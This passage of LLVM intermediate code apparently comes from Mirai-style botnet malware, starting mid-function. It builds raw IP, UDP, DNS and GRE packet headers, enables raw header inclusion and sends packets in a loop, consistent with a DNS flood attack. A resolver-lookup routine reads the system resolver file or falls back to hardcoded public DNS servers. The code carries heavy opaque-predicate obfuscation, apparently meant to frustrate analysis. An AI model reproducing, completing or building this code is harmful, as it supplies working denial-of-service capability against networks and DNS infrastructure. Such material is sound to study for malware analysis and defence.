  %565 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %566 = load %struct.sockaddr*, %struct.sockaddr** %565, align 8
  %567 = call i64 @sendto(i32 %548, i8* %549, i64 %557, i32 16384, %struct.sockaddr* %566, i32 16)
  br label %568

; <label>:568:                                    ; preds = %500
  %569 = load i32, i32* %9, align 4
  %570 = add nsw i32 %569, 1
  store i32 %570, i32* %9, align 4
  br label %374

; <label>:571:                                    ; preds = %originalBBpart260
  %572 = load i32, i32* @x.37
  %573 = load i32, i32* @y.38
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %571
  %580 = load i32, i32* @x.37
  %581 = load i32, i32* @y.38
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %357

; <label>:588:                                    ; preds = %108, %86, %80
  %589 = load i32, i32* @x.37
  %590 = load i32, i32* @y.38
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %588
  %597 = load i32, i32* @x.37
  %598 = load i32, i32* @y.38
  %599 = sub i32 %597, 1
  %600 = mul i32 %597, %599
  %601 = urem i32 %600, 2
  %602 = icmp eq i32 %601, 0
  %603 = icmp slt i32 %598, 10
  %604 = or i1 %602, %603
  br i1 %604, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %87
  store i32 1, i32* %9, align 4
  %605 = load i32, i32* %10, align 4
  %606 = bitcast i32* %9 to i8*
  %607 = call i32 @setsockopt(i32 %605, i32 0, i32 3, i8* %606, i32 4) #6
  %608 = icmp eq i32 %607, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %176
  %609 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 6
  store i8 17, i8* %610, align 1
  %611 = load i32, i32* @LOCAL_ADDR, align 4
  %612 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %613 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %612, i32 0, i32 8
  store i32 %611, i32* %613, align 4
  %614 = load i32, i32* %22, align 4
  %615 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %616 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %615, i32 0, i32 9
  store i32 %614, i32* %616, align 4
  %617 = load i16, i16* %16, align 2
  %618 = call zeroext i16 @htons(i16 zeroext %617) #7
  %619 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %620 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %619, i32 0, i32 0
  store i16 %618, i16* %620, align 2
  %621 = load i16, i16* %17, align 2
  %622 = call zeroext i16 @htons(i16 zeroext %621) #7
  %623 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %624 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %623, i32 0, i32 1
  store i16 %622, i16* %624, align 2
  %625 = load i8, i8* %19, align 1
  %626 = zext i8 %625 to i64
  %_ = shl i64 21, %626
  %_2 = sub i64 21, %626
  %gen = mul i64 %_2, %626
  %_3 = sub i64 0, 21
  %gen4 = add i64 %_3, %626
  %627 = add i64 21, %626
  %_5 = sub i64 %627, 2
  %gen6 = mul i64 %_5, 2
  %_7 = sub i64 0, %627
  %gen8 = add i64 %_7, 2
  %_9 = shl i64 %627, 2
  %_10 = shl i64 %627, 2
  %628 = add i64 %627, 2
  %629 = load i32, i32* %21, align 4
  %630 = sext i32 %629 to i64
  %_11 = sub i64 %628, %630
  %gen12 = mul i64 %_11, %630
  %_13 = sub i64 0, %628
  %gen14 = add i64 %_13, %630
  %_15 = shl i64 %628, %630
  %_16 = shl i64 %628, %630
  %_17 = sub i64 0, %628
  %gen18 = add i64 %_17, %630
  %_19 = sub i64 0, %628
  %gen20 = add i64 %_19, %630
  %631 = add i64 %628, %630
  %_21 = sub i64 %631, 4
  %gen22 = mul i64 %_21, 4
  %_23 = sub i64 %631, 4
  %gen24 = mul i64 %_23, 4
  %_25 = shl i64 %631, 4
  %_26 = sub i64 0, %631
  %gen27 = add i64 %_26, 4
  %_28 = shl i64 %631, 4
  %_29 = sub i64 %631, 4
  %gen30 = mul i64 %_29, 4
  %632 = add i64 %631, 4
  %633 = trunc i64 %632 to i16
  %634 = call zeroext i16 @htons(i16 zeroext %633) #7
  %635 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %636 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %635, i32 0, i32 2
  store i16 %634, i16* %636, align 2
  %637 = load i16, i16* %18, align 2
  %638 = call zeroext i16 @htons(i16 zeroext %637) #7
  %639 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %640 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %639, i32 0, i32 0
  store i16 %638, i16* %640, align 2
  %641 = call zeroext i16 @htons(i16 zeroext 256) #7
  %642 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %643 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %642, i32 0, i32 1
  store i16 %641, i16* %643, align 2
  %644 = call zeroext i16 @htons(i16 zeroext 1) #7
  %645 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %646 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %645, i32 0, i32 2
  store i16 %644, i16* %646, align 2
  %647 = load i8, i8* %19, align 1
  %648 = load i8*, i8** %29, align 8
  %649 = getelementptr inbounds i8, i8* %648, i32 1
  store i8* %649, i8** %29, align 8
  store i8 %647, i8* %648, align 1
  %650 = load i8, i8* %19, align 1
  %651 = zext i8 %650 to i32
  %652 = load i8*, i8** %29, align 8
  %653 = sext i32 %651 to i64
  %654 = getelementptr inbounds i8, i8* %652, i64 %653
  store i8* %654, i8** %29, align 8
  %655 = load i8*, i8** %29, align 8
  store i8* %655, i8** %30, align 8
  %656 = load i8*, i8** %29, align 8
  %657 = getelementptr inbounds i8, i8* %656, i64 1
  %658 = load i8*, i8** %20, align 8
  %659 = load i32, i32* %21, align 4
  %_31 = sub i32 %659, 1
  %gen32 = mul i32 %_31, 1
  %_33 = sub i32 0, %659
  %gen34 = add i32 %_33, 1
  %660 = add nsw i32 %659, 1
  call void @util_memcpy(i8* %657, i8* %658, i32 %660)
  store i32 0, i32* %23, align 4
  br label %originalBB1

originalBB38alteredBB:                            ; preds = %originalBB38, %249
  %661 = load i8*, i8** %20, align 8
  %662 = load i32, i32* %23, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds i8, i8* %661, i64 %663
  %665 = load i8, i8* %664, align 1
  %666 = sext i8 %665 to i32
  %667 = icmp eq i32 %666, 46
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %286
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %306
  %668 = load i8, i8* %24, align 1
  %669 = load i8*, i8** %30, align 8
  store i8 %668, i8* %669, align 1
  %670 = load i8*, i8** %29, align 8
  %671 = load i32, i32* %21, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds i8, i8* %670, i64 %672
  %674 = getelementptr inbounds i8, i8* %673, i64 2
  %675 = bitcast i8* %674 to %struct.grehdr*
  store %struct.grehdr* %675, %struct.grehdr** %31, align 8
  %676 = call zeroext i16 @htons(i16 zeroext 1) #7
  %677 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %678 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %677, i32 0, i32 0
  store i16 %676, i16* %678, align 2
  %679 = call zeroext i16 @htons(i16 zeroext 1) #7
  %680 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %681 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %680, i32 0, i32 1
  store i16 %679, i16* %681, align 2
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %340
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %357
  store i32 0, i32* %9, align 4
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %374
  %682 = load i32, i32* %9, align 4
  %683 = load i8, i8* %5, align 1
  %684 = zext i8 %683 to i32
  %685 = icmp slt i32 %682, %684
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %395
  %686 = load i8**, i8*** %11, align 8
  %687 = load i32, i32* %9, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds i8*, i8** %686, i64 %688
  %690 = load i8*, i8** %689, align 8
  store i8* %690, i8** %32, align 8
  %691 = load i8*, i8** %32, align 8
  %692 = bitcast i8* %691 to %struct.iphdr*
  store %struct.iphdr* %692, %struct.iphdr** %33, align 8
  %693 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %694 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %693, i64 1
  %695 = bitcast %struct.iphdr* %694 to %struct.udphdr*
  store %struct.udphdr* %695, %struct.udphdr** %34, align 8
  %696 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %697 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %696, i64 1
  %698 = bitcast %struct.udphdr* %697 to %struct.dnshdr*
  store %struct.dnshdr* %698, %struct.dnshdr** %35, align 8
  %699 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %700 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %699, i64 1
  %701 = bitcast %struct.dnshdr* %700 to i8*
  %702 = getelementptr inbounds i8, i8* %701, i64 1
  store i8* %702, i8** %36, align 8
  %703 = load i16, i16* %13, align 2
  %704 = zext i16 %703 to i32
  %705 = icmp eq i32 %704, 65535
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %458
  %706 = load i16, i16* %18, align 2
  %707 = zext i16 %706 to i32
  %708 = icmp eq i32 %707, 65535
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %478
  %709 = call i32 @rand_next()
  %_71 = shl i32 %709, 65535
  %710 = and i32 %709, 65535
  %711 = trunc i32 %710 to i16
  %712 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %713 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %712, i32 0, i32 0
  store i16 %711, i16* %713, align 2
  br label %originalBB70

originalBB75alteredBB:                            ; preds = %originalBB75, %571
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %588
  br label %originalBB79
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.39
  %2 = load i32, i32* @y.40
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %19 = call i8* @table_retrieve_val(i32 21, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 21)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.39
  %24 = load i32, i32* @y.40
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %255

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.39
  %33 = load i32, i32* @y.40
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = load i32, i32* %10, align 4
  %41 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %42 = call i64 @read(i32 %40, i8* %41, i64 2048)
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %11, align 4
  %44 = load i32, i32* %10, align 4
  %45 = call i32 @close(i32 %44)
  call void @table_unlock_val(i8 zeroext 22)
  %46 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %47 = load i32, i32* %11, align 4
  %48 = call i8* @table_retrieve_val(i32 22, i32* null)
  %49 = call i32 @util_stristr(i8* %46, i32 %47, i8* %48)
  store i32 %49, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 22)
  %50 = load i32, i32* %12, align 4
  %51 = icmp ne i32 %50, -1
  %52 = load i32, i32* @x.39
  %53 = load i32, i32* @y.40
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %51, label %60, label %238

; <label>:60:                                     ; preds = %originalBBpart24
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %61 = load i32, i32* %12, align 4
  store i32 %61, i32* %14, align 4
  br label %62

; <label>:62:                                     ; preds = %212, %60
  %63 = load i32, i32* %14, align 4
  %64 = load i32, i32* %11, align 4
  %65 = icmp slt i32 %63, %64
  br i1 %65, label %66, label %215

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %14, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %68
  %70 = load i8, i8* %69, align 1
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %16, align 1
  %72 = icmp ne i8 %71, 0
  br i1 %72, label %132, label %73

; <label>:73:                                     ; preds = %66
  %74 = load i32, i32* @x.39
  %75 = load i32, i32* @y.40
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8, i8* %18, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp eq i32 %83, 32
  %85 = load i32, i32* @x.39
  %86 = load i32, i32* @y.40
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %84, label %97, label %93

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = load i8, i8* %18, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp eq i32 %95, 9
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %93, %originalBBpart28
  br label %212

; <label>:98:                                     ; preds = %93
  %99 = load i32, i32* @x.39
  %100 = load i32, i32* @y.40
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %98
  store i8 1, i8* %16, align 1
  %107 = load i32, i32* @x.39
  %108 = load i32, i32* @y.40
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %115

; <label>:115:                                    ; preds = %originalBBpart212
  %116 = load i32, i32* @x.39
  %117 = load i32, i32* @y.40
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %115
  %124 = load i32, i32* @x.39
  %125 = load i32, i32* @y.40
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %132

; <label>:132:                                    ; preds = %originalBBpart216, %66
  %133 = load i8, i8* %18, align 1
  %134 = sext i8 %133 to i32
  %135 = icmp ne i32 %134, 46
  br i1 %135, label %136, label %160

; <label>:136:                                    ; preds = %132
  %137 = load i32, i32* @x.39
  %138 = load i32, i32* @y.40
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %136
  %145 = load i8, i8* %18, align 1
  %146 = sext i8 %145 to i32
  %147 = icmp slt i32 %146, 48
  %148 = load i32, i32* @x.39
  %149 = load i32, i32* @y.40
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %147, label %181, label %156

; <label>:156:                                    ; preds = %originalBBpart220
  %157 = load i8, i8* %18, align 1
  %158 = sext i8 %157 to i32
  %159 = icmp sgt i32 %158, 57
  br i1 %159, label %181, label %160

; <label>:160:                                    ; preds = %156, %132
  %161 = load i32, i32* @x.39
  %162 = load i32, i32* @y.40
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %160
  %169 = load i32, i32* %14, align 4
  %170 = load i32, i32* %11, align 4
  %171 = sub nsw i32 %170, 1
  %172 = icmp eq i32 %169, %171
  %173 = load i32, i32* @x.39
  %174 = load i32, i32* @y.40
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart227, label %originalBB22alteredBB

originalBBpart227:                                ; preds = %originalBB22
  br i1 %172, label %181, label %195

; <label>:181:                                    ; preds = %originalBBpart227, %156, %originalBBpart220
  %182 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %184 = load i32, i32* %12, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds i8, i8* %183, i64 %185
  %187 = load i32, i32* %14, align 4
  %188 = load i32, i32* %12, align 4
  %189 = sub nsw i32 %187, %188
  call void @util_memcpy(i8* %182, i8* %186, i32 %189)
  %190 = load i32, i32* %14, align 4
  %191 = load i32, i32* %12, align 4
  %192 = sub nsw i32 %190, %191
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %193
  store i8 0, i8* %194, align 1
  store i8 1, i8* %17, align 1
  br label %215

; <label>:195:                                    ; preds = %originalBBpart227
  %196 = load i32, i32* @x.39
  %197 = load i32, i32* @y.40
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %195
  %204 = load i32, i32* @x.39
  %205 = load i32, i32* @y.40
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %212

; <label>:212:                                    ; preds = %originalBBpart231, %97
  %213 = load i32, i32* %14, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %14, align 4
  br label %62

; <label>:215:                                    ; preds = %181, %62
  %216 = load i8, i8* %17, align 1
  %217 = icmp ne i8 %216, 0
  br i1 %217, label %218, label %237

; <label>:218:                                    ; preds = %215
  %219 = load i32, i32* @x.39
  %220 = load i32, i32* @y.40
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %218
  %227 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %228 = call i32 @inet_addr(i8* %227) #6
  store i32 %228, i32* %9, align 4
  %229 = load i32, i32* @x.39
  %230 = load i32, i32* @y.40
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %298

; <label>:237:                                    ; preds = %215
  br label %238

; <label>:238:                                    ; preds = %237, %originalBBpart24
  %239 = load i32, i32* @x.39
  %240 = load i32, i32* @y.40
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %238
  %247 = load i32, i32* @x.39
  %248 = load i32, i32* @y.40
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %255

; <label>:255:                                    ; preds = %originalBBpart239, %originalBBpart2
  %256 = load i32, i32* @x.39
  %257 = load i32, i32* @y.40
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %255
  %264 = call i32 @rand_next()
  %265 = urem i32 %264, 4
  %266 = load i32, i32* @x.39
  %267 = load i32, i32* @y.40
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart245, label %originalBB41alteredBB

originalBBpart245:                                ; preds = %originalBB41
  switch i32 %265, label %298 [
    i32 0, label %274
    i32 1, label %276
    i32 2, label %278
    i32 3, label %280
  ]

; <label>:274:                                    ; preds = %originalBBpart245
  %275 = call i32 @htonl(i32 134744072) #7
  store i32 %275, i32* %9, align 4
  br label %298

; <label>:276:                                    ; preds = %originalBBpart245
  %277 = call i32 @htonl(i32 1246898730) #7
  store i32 %277, i32* %9, align 4
  br label %298

; <label>:278:                                    ; preds = %originalBBpart245
  %279 = call i32 @htonl(i32 1074151430) #7
  store i32 %279, i32* %9, align 4
  br label %298

; <label>:280:                                    ; preds = %originalBBpart245
  %281 = load i32, i32* @x.39
  %282 = load i32, i32* @y.40
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %280
  %289 = call i32 @htonl(i32 67240450) #7
  store i32 %289, i32* %9, align 4
  %290 = load i32, i32* @x.39
  %291 = load i32, i32* @y.40
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %298

; <label>:298:                                    ; preds = %originalBBpart249, %278, %276, %274, %originalBBpart245, %originalBBpart235
  %299 = load i32, i32* %9, align 4
  ret i32 %299

originalBBalteredBB:                              ; preds = %originalBB, %0
  %300 = alloca i32, align 4
  %301 = alloca i32, align 4
  %302 = alloca i32, align 4
  %303 = alloca i32, align 4
  %304 = alloca [2048 x i8], align 16
  %305 = alloca i32, align 4
  %306 = alloca [32 x i8], align 16
  %307 = alloca i8, align 1
  %308 = alloca i8, align 1
  %309 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %310 = call i8* @table_retrieve_val(i32 21, i32* null)
  %311 = call i32 (i8*, i32, ...) @open(i8* %310, i32 0)
  store i32 %311, i32* %301, align 4
  call void @table_lock_val(i8 zeroext 21)
  %312 = load i32, i32* %301, align 4
  %313 = icmp sge i32 %312, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %314 = load i32, i32* %10, align 4
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %316 = call i64 @read(i32 %314, i8* %315, i64 2048)
  %317 = trunc i64 %316 to i32
  store i32 %317, i32* %11, align 4
  %318 = load i32, i32* %10, align 4
  %319 = call i32 @close(i32 %318)
  call void @table_unlock_val(i8 zeroext 22)
  %320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %321 = load i32, i32* %11, align 4
  %322 = call i8* @table_retrieve_val(i32 22, i32* null)
  %323 = call i32 @util_stristr(i8* %320, i32 %321, i8* %322)
  store i32 %323, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 22)
  %324 = load i32, i32* %12, align 4
  %325 = icmp ne i32 %324, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %326 = load i8, i8* %18, align 1
  %327 = sext i8 %326 to i32
  %328 = icmp eq i32 %327, 32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %98
  store i8 1, i8* %16, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %115
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %136
  %329 = load i8, i8* %18, align 1
  %330 = sext i8 %329 to i32
  %331 = icmp slt i32 %330, 48
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %160
  %332 = load i32, i32* %14, align 4
  %333 = load i32, i32* %11, align 4
  %_ = sub i32 %333, 1
  %gen = mul i32 %_, 1
  %_23 = shl i32 %333, 1
  %_24 = sub i32 %333, 1
  %gen25 = mul i32 %_24, 1
  %334 = sub nsw i32 %333, 1
  %335 = icmp eq i32 %332, %334
  br label %originalBB22

originalBB29alteredBB:                            ; preds = %originalBB29, %195
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %218
  %336 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %337 = call i32 @inet_addr(i8* %336) #6
  store i32 %337, i32* %9, align 4
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %238
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %255
  %338 = call i32 @rand_next()
  %_42 = sub i32 %338, 4
  %gen43 = mul i32 %_42, 4
  %339 = urem i32 %338, 4
  br label %originalBB41

originalBB47alteredBB:                            ; preds = %originalBB47, %280
  %340 = call i32 @htonl(i32 67240450) #7
  store i32 %340, i32* %9, align 4
  br label %originalBB47
